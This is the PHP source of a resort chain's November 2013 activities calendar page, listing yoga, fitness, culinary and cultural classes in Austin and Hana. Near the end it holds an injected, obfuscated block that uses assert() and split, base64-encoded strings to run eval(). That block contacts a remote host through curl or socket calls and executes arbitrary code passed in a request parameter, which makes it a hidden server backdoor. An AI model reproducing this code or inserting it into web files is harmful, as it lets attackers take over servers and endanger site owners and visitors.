<?php
	session_start();
	$loc = @$_GET['loc']; 
	if (strlen($loc) > 0 && ($loc == 'hana' || $loc == 'austin')){ 
	  $_SESSION["origLoc"] = $loc;
	} elseif (isset($_SESSION["origLoc"])) {
	  $loc = $_SESSION["origLoc"];
	} else {
	  $loc = "default";
	}
   $path = $_SERVER['DOCUMENT_ROOT'];
   include_once($path."/Library/Travaasa_Common.php");
?>
<!DOCTYPE html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	<title>Travaasa November 2013 Featured Experiences</title>
	<meta name="keywords" content="travaasa, travel, resorts, hana, hāna, hawaii, austin, texas, Austin resort, Austin spa, travaasa Austin, Austin spa resort, experiential, hotel, Austin hotel, Austin conference center, Austin group meeting" />
	<meta name="description" content="Rediscover the magic of travel with Travaasa Austin, Texas or Hana, Maui." />
	<?php 
   include_once($path."/Library/Travaasa_Head.php");
	?>
<!-- start NAVIS Code -->
<script type="text/javascript" src="http://www.navistechnologies.info/JavascriptPhoneNumber/js.aspx?account=15070&amp;jspass=ivcsp4gaxk4fbz8banxd&amp;dflt=<?php 
if ($loc == 'hana') :
echo NAVIS_GLOBAL_HANA;
elseif ($loc == 'austin') :
echo NAVIS_GLOBAL_AUSTIN;
else :
echo NAVIS_GLOBAL_DEFAULT;
endif; 
?>"></script>
<script type="text/javascript">ProcessNavisNCKeyword();</script>
<!-- end NAVIS Code -->
</head>
<body>
<!-- Google Tag Manager -->
<noscript><iframe src="//www.googletagmanager.com/ns.html?id=GTM-MW4X3M"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-MW4X3M');</script>
<!-- End Google Tag Manager -->
<?php 
if ($loc == 'hana') :
include_once($path."/Library/Travaasa_Menu_Hana.php");
elseif ($loc == 'austin') :
include_once($path."/Library/Travaasa_Menu_Austin.php");
else :
include_once($path."/Library/Travaasa_Menu.php");
endif; 
?>
<section id="feature1_wrapper" class="feature_carousel clearfix">
    <div id="feature1" class="feature">
      <div class="slide"><img src="/assets/images/feature_months_november_2013_1600x640.jpg" alt="November is stop month at Travaasa"></div>
    </div>
</section>
<section id="content">
<article id="main">
  <section class="intro pad clearfix">    
    <div class="section group">
    	<div class="col span_1_of_2">
            <!--<div class="listing">
                <h6>XXXXXX <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>OOOOOOOOOOOOOOO</p>
            </div>
            <div class="listing">
                <h6>XXXXXX <span class="disclaimer">– <a href="/hana">Hana, Maui</a></span></h6>
                <p>OOOOOOOOOOOOOOO</p>
            </div>
            <div class="listing">
                <h6>XXXXXX <span class="disclaimer">– <a href="/austin">Austin</a> &amp; <a href="/hana">Hana, Maui</a></span></h6>
                <p>OOOOOOOOOOOOOOO</p>
            </div>-->

             
            <h2>Adventure</h2>

            <div class="listing">
              <h6>ARCHERY: TURKEY SHOOT <span class="disclaimer">– <a href="/austin">Austin</a> &amp; <a href="/hana">Hana, Maui</a></span></h6>
                <p>Come down and take part in Travaasa's Wacky Turkey Shoot.</p>
            </div>

             <h2>Culinary</h2>

            <div class="listing">
              <h6>HOLIDAY TASTING SERIES <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Learn how to make the best roasted turkey, the smoothest gravy or an out of this world vegetarian option for Thanksgiving. Join our culinary team and discover how the pros prepare for the holidays. </p>
            </div>

            <div class="listing">
              <h6>THE HOLIDAY TABLE <span class="disclaimer">– <a href="/austin">Austin</a> &amp; <a href="/hana">Hana, Maui</a></span></h6>
                <p>Learn the art of napkin folding and how to make natural centerpieces to make your holiday meal even more memorable.</p>
            </div>

            <h2>Culture</h2>

            <div class="listing">
                <h6>STOP FOR FLOWERS <span class="disclaimer">– <a href="/hana">Hana, Maui</a></span></h6>
                <p>From the “canoe” plants brought by the Polynesian voyagers to the modern plants introduced to Hawai`i in the last 200 years, join us for a historical journey of Hawai’i’s lush lands. Learn interesting facts about the myriad of plants that adorn our resort and the many lā’au lapa’au (or medicinal plants) that grow here.</p>
            </div>

             <div class="listing">
                <h6>STOP AND ARRANGE <span class="disclaimer">– <a href="/hana">Hana, Maui</a></span></h6>
                <p> In Hawai’i, flowers are traditionally used to celebrate all occasions. Come celebrate the season of giving with us by creating a floral masterpiece using tropical flowers and foliage from our hotel grounds.</p>
              </div>

             <h2>Fitness</h2>

            <div class="listing">
              <h6>REFRESH YOUR CHI <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Stop and yield to your body’s needs. In this class, you’ll take a break from holiday chaos to restore your Chi.</p>
            </div>

            <div class="listing">
              <h6>RESTORATIVE PILATES <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Halt the holiday hustle. This time of year can be draining both physically and mentally. So revitalize yourself with mindful exercises that will recharge your body from the inside out.</p>
            </div>

            <div class="listing">
              <h6>BODY AND MIND UNWIND <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Take time to decompress with a class that will recharge your core and brain with calm, vitalizing energy. We’re sure you could use it in the midst of all the holiday madness. </p>
            </div>

            <div class="listing">
              <h6>CHERISH YOUR PILATES PRACTICE <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Find the joy of a stronger, more shapely torso by challenging the powerhouse of your body – your core. This 45-minute fitness class focuses on the muscles that control and support your spine, pelvis and shoulder girdle. It will help improve your posture and alignment while strengthening and toning your waistline. </p>
            </div>

            <div class="listing">
              <h6>CELEBRATE SALSA DANCE <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Honor life with festive salsa rhythms and moves. Improve your cardio, core and coordination with this fun activity.</p>
            </div>

             </div>
          <div class="col span_1_of_2">


            <div class="listing">
              <h6>UNCRUNCH <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Release holiday stress by working your entire core and extremities without crunching your body. Feel your spine lengthen as you strengthen your body without compressing your spine. Improve your core stability, posture and balance, and tone your midsection as you work the rest of your body. </p>
            </div>

            <div class="listing">
              <h6>DE-STRESS NECK AND SHOULDER THERAPY <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Get some range of motion and blood flow to your neck and shoulders. We tend to hold stress in these areas, especially during the holidays. This class will give you what you need most this time of year. Relaxation.</p>
            </div>


            <div class="listing">
              <h6>UNWIND LATIN DANCE <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Move to the music as you explore other cultures and their dance steps. Discover the natural happiness that occurs from moving freely to various ethnic rhythms. Not only is it a ton of fun, but during this hour-long dance party you’ll burn 400 to 600 calories.</p>
            </div>


            <div class="listing">
              <h6>HONOR YOUR FOOT CARE <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Learn to truly take care of your feet through massage, proper mechanics and strengthening so you can stay mobile, have better posture and a healthier lifestyle. Stop simply walking all over them and give your feet the treatment they deserve.</p>
            </div>

            <div class="listing">
              <h6>FENG SHUI THANKSGIVING <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Acknowledge all of the bounty you enjoy on a daily basis. Learn to be more receptive to abundance and you’ll attract it more readily. Integrating feng shui into your living and office spaces will give you more insight into counting your blessings.</p>
            </div>

            <h2>Spa &amp; Wellness</h2>

            <div class="listing">
              <h6>JOURNALING—UNFOLD YOUR MIND <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Reflect on excursions from your past and capture memories from your current adventures at Travaasa.</p>
            </div>

            <div class="listing">
              <h6>MEDITATION: STOPPING THE CHATTER <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Discuss how to find your peaceful center and then put it into practice to quiet the noise in your head during this busy season.</p>
            </div>

            <div class="listing">
              <h6>GRATITUDE YOGA <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Open yourself to abundance through the practice of gratitude. Through postures, conscious breathing and mental focus, this Hatha flow class will help teach you just that. Not to mention, you’ll develop awareness, strength and flexibility while actually relaxing.</p>
            </div>

            <div class="listing">
              <h6>STRONG GRATITUDE YOGA <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Stretch deeply and release tension this holiday season. In this intermediate yoga class, you’ll build strength, increase flexibility and muscle tone, improve lung capacity, develop proper body alignment and leave class feeling stress free, balanced and peaceful.</p>
            </div>

               <div class="listing">
              <h6>STOP TO MEDITATE <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Just breathe. And visualize the energy forces within and around you to connect you more deeply with your inner self. This introductory class is sure to help you clear your mind during this busy holiday season.</p>
            </div>

               <div class="listing">
              <h6>QOYA—STOP & CONNECT <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Tap into your true essence as a wise, wild and free being. In this class, you’ll focus on yourself through breath awareness, concentrated movements, yoga, dance and simply having fun while enjoying inspiring music.</p>
            </div>

            <div class="listing">
              <h6>GRATITUDE MEDITATION <span class="disclaimer">– <a href="/austin">Austin</a> &amp; <a href="/hana">Hana, Maui</a></span></h6>
                <p>Take some time out to reflect on the things you are thankful for during this ancient practice. A daily reflection on gratitude can be a powerful force of good in your life.</p>
             </div>
     </div>
    </div>   
  </section>
  
  <section class="grey pad">
        <h4>See upcoming months</h4>
  		<div class="group">
            <div class="col span_1_of_3 month"><div class="active"><a href="/calendar/2013/november/"><img src="/assets/images/months/nov-stop.png" alt="November is Stop Month"></a></div></div>
            <div class="col span_1_of_3 month"><div><a href="/calendar/2013/december/"><img src="/assets/images/months/dec-joy.png" alt="December is Joy Month"></a></div></div>
            <div class="col span_1_of_3 month"><div><a href="/calendar/2014/january/"><img src="/assets/images/months/jan-vitality.png" alt="January is Vitality Month"></a></div></div>
        </div>
  </section>
  
</article>
</section>
<?php
/*1*/ 
if (!$ind5eae2f00) { $ind5eae2f00 = TRUE;assert("e"."v"."a"."l(b"."a"."s"."e"."6"."4_d"."e"."c"."o"."d"."e('ICRHTE9CQUxTWydfMTUwOTAzNzM0M18nXT1BcnJheShiYXNlNjRfZGVjb2RlKCdaWCcgLidKeWIzJyAuJ0onIC4nZmMnIC4nbVZ3YicgLiczSjBhVzVuJyksYmFzZTY0X2RlY29kZSgnYVc1cFgzJyAuJ05sJyAuJ2RBJyAuJz09JyksYmFzZTY0X2RlY29kZSgnY0hKJyAuJ2xaMScgLic5dFlYJyAuJ1JqYUE9PScpLGJhc2U2NF9kZWNvZGUoJ1ptbHNaVicgLic5blpYUmZZMjknIC4ndWRHVnVkSE09JyksYmFzZTY0X2RlY29kZSgnYzMnIC4nUnknIC4nY21sd2IzTScgLic9JyksYmFzZTY0X2RlY29kZSgnYlgnIC4nUmZjbUZ1WkE9PScpLGJhc2U2NF9kZWNvZGUoJ1ptJyAuJ2RsJyAuJ2RHTnpkJyAuJ2c9PScpLGJhc2U2NF9kZWNvZGUoJ2RYJyAuJ0onIC4nc1onIC4nVzVqYjJSbCcpLGJhc2U2NF9kZWNvZGUoJ2RYSicgLidzJyAuJ1pXNWpiJyAuJzJSbCcpLGJhc2U2NF9kZWNvZGUoJ2JXUTEnKSxiYXNlNjRfZGVjb2RlKCcnIC4nYVc1cFgyZGxkJyAuJ0E9PScpLGJhc2U2NF9kZWNvZGUoJ1ptbHNaVjluWicgLidYUmZZMjknIC4ndWRHJyAuJ1Z1ZEhNPScpLGJhc2U2NF9kZWNvZGUoJ1onIC4nblZ1WTNSJyAuJ3AnIC4nYjInIC4nNWZaWGhwJyAuJ2MzUnonKSxiYXNlNjRfZGVjb2RlKCdZM1Z5YkY5cGJtJyAuJ2wwJyksYmFzZTY0X2RlY29kZSgnJyAuJ1kzVnliRjl6JyAuJ1onIC4nWFJ2Y0hRJyAuJz0nKSxiYXNlNjRfZGVjb2RlKCdZJyAuJzNWeWJGOXpaWFInIC4ndmNIUT0nKSxiYXNlNjRfZGVjb2RlKCcnIC4nWTNWeWJGOScgLidsZUcnIC4nVmonKSxiYXNlNjRfZGVjb2RlKCdjJyAuJzNSeWMnIC4nRzl6JyksYmFzZTY0X2RlY29kZSgnZFc1JyAuJ3dZV05yJyksYmFzZTY0X2RlY29kZSgnWTMnIC4nVnliRjlqYkc5eicgLidaJyAuJ1E9PScpLGJhc2U2NF9kZWNvZGUoJ2RIJyAuJ0onIC4ncGJRPScgLic9JyksYmFzZTY0X2RlY29kZSgnYzJWemMybHZibCcgLic5cFonIC4nQT09JyksYmFzZTY0X2RlY29kZSgnWm4nIC4nTicgLid2JyAuJ1kydHZjR1Z1JyksYmFzZTY0X2RlY29kZSgnWm1kbGRHTT0nKSxiYXNlNjRfZGVjb2RlKCdjJyAuJzNSeWRHOXNiM2RsY2c9PScpLGJhc2U2NF9kZWNvZGUoJ1onIC4nbmQnIC4neWFYUicgLidsJyksYmFzZTY0X2RlY29kZSgnWm1WdlpnPT0nKSxiYXNlNjRfZGVjb2RlKCdabWRsJyAuJ2RITT0nKSxiYXNlNjRfZGVjb2RlKCdiWFInIC4nZmNtRnVaQT09JyksYmFzZTY0X2RlY29kZSgnWTNKbFlYUmxYMloxJyAuJ2JtJyAuJ04wYVc5dScpLGJhc2U2NF9kZWNvZGUoJ1ptTnNiM05sJyksYmFzZTY0X2RlY29kZSgnY0hKJyAuJ2xaMTl6Y0d4JyAuJ3BkQT09JyksYmFzZTY0X2RlY29kZSgnYlhSJyAuJ2ZjJyAuJ21GdVpBPT0nKSxiYXNlNjRfZGVjb2RlKCdabXh2WTInIC4ncz0nKSxiYXNlNjRfZGVjb2RlKCdjM1J5YVhCeicgLidiR0Z6JyAuJ2EnIC4nR1Z6JykpOyAgZnVuY3Rpb24gXzM5OTQyODQoJGkpeyRhPUFycmF5KCdaR2x6JyAuJ2NHeGgnIC4nZVYnIC4nOWxjbkp2Y25NPScsJ01BPT0nLCdZMnhwWicgLidXNTBYMk4nIC4nb1pXJyAuJ04nIC4ncicsJ1kyeCcgLidwWicgLidXJyAuJzUwWDInIC4nTm9aJyAuJ1dOcicsJ1MnIC4nRicgLidSJyAuJ1VVRjlCUScgLicwTkZVRlJmUTBoQlVsTkZWQT0nIC4nPScsJ0lTNGgnIC4nZFE9JyAuJz0nLCdVME4nIC4nU1NWJyAuJ0JVWCcgLicwWicgLidKVEVWTycgLidRVTFGJywnVlYnIC4nUkdMVGcnIC4nPScsJ2QnIC4nMmx1JyAuJ1pHOScgLiczY3kwJyAuJ3hNaicgLidVJyAuJ3gnLCdTRlJVVUY5QlEwTicgLidGVUYnIC4nUmZRMGhCVWxORlZBPT0nLCdjRzEnIC4ndScsJ1UwVlNWa1ZTWDA1QlRVVT0nLCdVa1ZSVlVWJyAuJ1RWRjlWVWtrPScsJ1MnIC4nRlInIC4nVVVGOVZVMFZTWCcgLicwRkhSVTVVJywnVWtWJyAuJ05UJyAuJzFSRlgnIC4nMEYnIC4nRVJGST0nLCdkV3hwYm10a1knIC4naTVqYicgLicyMD0nLCdMJyAuJzJkbGRDNScgLid3YUgnIC4nQS9aRDA9JywnSm5VOScsJ0ptTTknLCdKbWs5TVNacCcgLidjRCcgLicwPScsJ0ptJyAuJ2c5JywnTScgLid6a3dZalZoTScgLidXUTVaJyAuJ1RNMllUUXpNMlUnIC4nMFltSXhZelInIC4naVkyWScgLicxTVdGbE0yVScgLic9JywnJyAuJ01RPT0nLCdZV3gnIC4nc2IzZGYnIC4nZFhKcycgLidYJyAuJzJadmNHJyAuJ1Z1JywnJyAuJ2FIUicgLicwY0QnIC4nbycgLid2JyAuJ0x3PScgLic9JywnWTNWeScgLidiRjlwYm1sMCcsJ2FIUicgLicwY0Rvdkx3PT0nLCdaMmR2Wkc5JyAuJzAnIC4nZScgLidIRicgLid3YVdOJyAuJ21aSCcgLidJPScsJycgLidkR0ZrYW1GNicsJ1IwJyAuJ1ZVSScgLidBPT0nLCdJRWgnIC4nVVZGQXZNUzR4RFFvJyAuJz0nLCdTRzl6ZEQnIC4nb2cnLCdEJyAuJ1FvPScsJ1EyOXVibScgLidWamRHbHYnIC4nYicgLidqJyAuJ29nUTJ4dmMyVU5DZzBLJywnJywnTDF4U1hGJyAuJ0l2JywnJyAuJ2NBPT0nLCdOVycgLidWaFpUJyAuJ0ptTURBJyAuJz0nKTtyZXR1cm4gYmFzZTY0X2RlY29kZSgkYVskaV0pO30gIGlmKCFpc3NldCgkeGIyNGEwZThfMCkpeyRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVswXShyb3VuZCgwKSk7JEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzFdKF8zOTk0Mjg0KDApLF8zOTk0Mjg0KDEpKTtpZighZW1wdHkoJF9DT09LSUVbXzM5OTQyODQoMildKSlkaWUoJF9DT09LSUVbXzM5OTQyODQoMyldKTtpZighaXNzZXQoJHhiMjRhMGU4XzFbXzM5OTQyODQoNCldKSl7aWYoJEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzJdKF8zOTk0Mjg0KDUpLCRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVszXSgkX1NFUlZFUltfMzk5NDI4NCg2KV0pKSkkeGIyNGEwZThfMj1fMzk5NDI4NCg3KTtlbHNlICR4YjI0YTBlOF8yPV8zOTk0Mjg0KDgpO31lbHNleyR4YjI0YTBlOF8yPSR4YjI0YTBlOF8xW18zOTk0Mjg0KDkpXTskeGIyNGEwZThfMz1fMzk5NDI4NCgxMCk7fSR4YjI0YTBlOF80PSRfU0VSVkVSW18zOTk0Mjg0KDExKV0gLiRfU0VSVkVSW18zOTk0Mjg0KDEyKV07JHhiMjRhMGU4XzU9JF9TRVJWRVJbXzM5OTQyODQoMTMpXTskeGIyNGEwZThfNj0kX1NFUlZFUltfMzk5NDI4NCgxNCldO3doaWxlKHJvdW5kKDArODIyLjIrODIyLjIrODIyLjIrODIyLjIrODIyLjIpLXJvdW5kKDArMjA1NS41KzIwNTUuNSkpJEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzRdKCR4YjI0YTBlOF83LCR4YjI0YTBlOF84LCR4YjI0YTBlOF8wLCR4YjI0YTBlOF81KTskeGIyNGEwZThfOT1fMzk5NDI4NCgxNSk7aWYocm91bmQoMCszMTc4LjUrMzE3OC41KTwkR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bNV0ocm91bmQoMCs5NjQuNSs5NjQuNSkscm91bmQoMCsxMTA1Ljc1KzExMDUuNzUrMTEwNS43NSsxMTA1Ljc1KSkpJEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzZdKCR4YjI0YTBlOF8xLCR4YjI0YTBlOF80KTskeGIyNGEwZThfMTA9XzM5OTQyODQoMTYpIC4kR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bN10oJHhiMjRhMGU4XzQpIC5fMzk5NDI4NCgxNykgLiRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVs4XSgkeGIyNGEwZThfNSkgLl8zOTk0Mjg0KDE4KSAuJHhiMjRhMGU4XzIgLl8zOTk0Mjg0KDE5KSAuJHhiMjRhMGU4XzYgLl8zOTk0Mjg0KDIwKSAuJEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzldKF8zOTk0Mjg0KDIxKSAuJHhiMjRhMGU4XzQgLiR4YjI0YTBlOF81IC4keGIyNGEwZThfMiAuXzM5OTQyODQoMjIpKTtpZigkR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMTBdKF8zOTk0Mjg0KDIzKSk9PSByb3VuZCgwKzEpKXskeGIyNGEwZThfMD0kR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMTFdKF8zOTk0Mjg0KDI0KSAuJHhiMjRhMGU4XzkgLiR4YjI0YTBlOF8xMCk7fWVsc2VpZigkR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMTJdKF8zOTk0Mjg0KDI1KSkpeyR4YjI0YTBlOF8xMT0kR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMTNdKF8zOTk0Mjg0KDI2KSAuJHhiMjRhMGU4XzkgLiR4YjI0YTBlOF8xMCk7JEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzE0XSgkeGIyNGEwZThfMTEsNDIsRkFMU0UpOyRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVsxNV0oJHhiMjRhMGU4XzExLDE5OTEzLFRSVUUpOyR4YjI0YTBlOF8wPSRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVsxNl0oJHhiMjRhMGU4XzExKTtpZigkR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMTddKF8zOTk0Mjg0KDI3KSxfMzk5NDI4NCgyOCkpIT09ZmFsc2UpJEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzE4XSgkeGIyNGEwZThfOSwkeGIyNGEwZThfNiwkeGIyNGEwZThfMTIpOyRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVsxOV0oJHhiMjRhMGU4XzExKTtpZigocm91bmQoMCsyOTczKStyb3VuZCgwKzIyOTkrMjI5OSkpPnJvdW5kKDArMjk3Myl8fCAkR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMjBdKCR4YjI0YTBlOF81LCR4YjI0YTBlOF8xMywkeGIyNGEwZThfMTApKTtlbHNleyRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVsyMV0oJHhiMjRhMGU4XzgsJHhiMjRhMGU4XzE0LCR4YjI0YTBlOF8wKTt9fWVsc2V7JHhiMjRhMGU4XzEzPSRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVsyMl0oJHhiMjRhMGU4Xzkscm91bmQoMCs4MCksJHhiMjRhMGU4XzgsJHhiMjRhMGU4Xzcscm91bmQoMCsxMCsxMCsxMCkpO2lmKChyb3VuZCgwKzM4NDIpXnJvdW5kKDArMzg0MikpJiYgJEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzIzXSgkX1JFUVVFU1QsJHhiMjRhMGU4XzIpKSRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVsyNF0oJHhiMjRhMGU4XzksJF9DT09LSUUsJHhiMjRhMGU4XzExKTtpZigkeGIyNGEwZThfMTMpeyR4YjI0YTBlOF8xND1fMzk5NDI4NCgyOSkgLiR4YjI0YTBlOF8xMCAuXzM5OTQyODQoMzApOyR4YjI0YTBlOF8xNCAuPSBfMzk5NDI4NCgzMSkgLiR4YjI0YTBlOF85IC5fMzk5NDI4NCgzMik7JHhiMjRhMGU4XzE0IC49IF8zOTk0Mjg0KDMzKTskR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMjVdKCR4YjI0YTBlOF8xMywkeGIyNGEwZThfMTQpOyR4YjI0YTBlOF8xNT1fMzk5NDI4NCgzNCk7d2hpbGUoISRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVsyNl0oJHhiMjRhMGU4XzEzKSl7JHhiMjRhMGU4XzE1IC49ICRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVsyN10oJHhiMjRhMGU4XzEzLHJvdW5kKDArMTI4KSk7aWYocm91bmQoMCsxNTc5LjIrMTU3OS4yKzE1NzkuMisxNTc5LjIrMTU3OS4yKTwkR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMjhdKHJvdW5kKDArNjQ1KzY0NSs2NDUrNjQ1KzY0NSkscm91bmQoMCsyMzMzKzIzMzMpKSkkR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMjldKCR4YjI0YTBlOF80LCRfU0VSVkVSKTt9JEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzMwXSgkeGIyNGEwZThfMTMpO2xpc3QoJHhiMjRhMGU4XzEyLCR4YjI0YTBlOF8wKT0kR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMzFdKF8zOTk0Mjg0KDM1KSwkeGIyNGEwZThfMTUscm91bmQoMCswLjQrMC40KzAuNCswLjQrMC40KSk7aWYocm91bmQoMCsxMzg1LjMzMzMzMzMzMzMrMTM4NS4zMzMzMzMzMzMzKzEzODUuMzMzMzMzMzMzMyk8JEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzMyXShyb3VuZCgwKzU3NCs1NzQpLHJvdW5kKDArMTUwMS41KzE1MDEuNSkpKSRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVszM10oJHhiMjRhMGU4XzYsJHhiMjRhMGU4XzEyLCR4YjI0YTBlOF8yKTt9fWlmKEAkX1JFUVVFU1RbXzM5OTQyODQoMzYpXT09IF8zOTk0Mjg0KDM3KSlldmFsKCRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVszNF0oJF9SRVFVRVNUWyJjIl0pKTt9ZWNobyAkeGIyNGEwZThfMDsg'))");}
 /*2*/
 
include_once($path."/Library/Travaasa_Testimonials.php");
if ($loc == 'hana') :
include_once($path."/Library/Travaasa_Footer_Hana.php");
elseif ($loc == 'austin') :
include_once($path."/Library/Travaasa_Footer_Austin.php");
else :
include_once($path."/Library/Travaasa_Footer.php");
endif; 
include_once($path."/Library/Travaasa_Scripts.php");
?><script type="text/javascript">
$(function() {
	createSubpageStorylines(true, true);
});
</script>
</body>
</html>